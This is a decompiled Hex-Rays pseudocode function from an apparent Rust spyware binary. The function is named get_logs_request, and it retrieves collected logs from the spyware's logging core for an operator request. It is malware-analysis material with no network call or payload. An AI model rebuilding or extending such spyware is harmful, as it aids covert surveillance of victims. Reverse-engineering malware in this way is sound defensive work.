__int64 __fastcall spyware::actions::log_actions::get_logs_request(__int64 a1)
{
  __int64 v1; // rax
  __int128 v3; // [rsp+0h] [rbp-78h] BYREF
  const char *v4; // [rsp+10h] [rbp-68h]
  __int64 v5; // [rsp+18h] [rbp-60h]
  __int64 v6; // [rsp+20h] [rbp-58h]
  __int128 v7; // [rsp+28h] [rbp-50h] BYREF
  __int64 v8; // [rsp+38h] [rbp-40h]
  __int128 v9; // [rsp+40h] [rbp-38h]
  __int128 v10; // [rsp+58h] [rbp-20h] BYREF
  __int64 v11; // [rsp+68h] [rbp-10h]

  if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER, 0LL) >= 4 )
  {
    *(_QWORD *)&v7 = &off_B99D8;
    *((_QWORD *)&v7 + 1) = 1LL;
    v8 = 8LL;
    v9 = 0LL;
    *(_QWORD *)&v3 = aSpywareActions_0;
    *((_QWORD *)&v3 + 1) = 29LL;
    v4 = aSpywareActions_0;
    v5 = 29LL;
    v6 = log::__private_api::loc(&off_B99F8);
    log::__private_api::log(&v7, 4LL, &v3);
  }
  spyware::logging::core::get_logs(&v10);
  if ( __OFSUB__(0LL, (_QWORD)v10) )
  {
    if ( core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER, 0LL) )
    {
      *(_QWORD *)&v7 = &off_B99E8;
      *((_QWORD *)&v7 + 1) = 1LL;
      v8 = 8LL;
      v9 = 0LL;
      v1 = log::__private_api::loc(&off_B9A10);
      *(_QWORD *)&v3 = aSpywareActions_0;
      *((_QWORD *)&v3 + 1) = 29LL;
      v4 = aSpywareActions_0;
      v5 = 29LL;
      v6 = v1;
      log::__private_api::log(&v7, 1LL, &v3);
    }
    *(_QWORD *)&v3 = 0LL;
    *((_QWORD *)&v3 + 1) = 8LL;
    v4 = 0LL;
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v7);
    *(_QWORD *)(a1 + 40) = v8;
    *(_OWORD *)(a1 + 24) = v7;
    *(_QWORD *)(a1 + 16) = v4;
    *(_OWORD *)a1 = v3;
    *(_DWORD *)(a1 + 48) = 1;
    return a1;
  }
  else
  {
    *(_QWORD *)(a1 + 16) = v11;
    *(_OWORD *)a1 = v10;
    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;
    return a1;
  }
}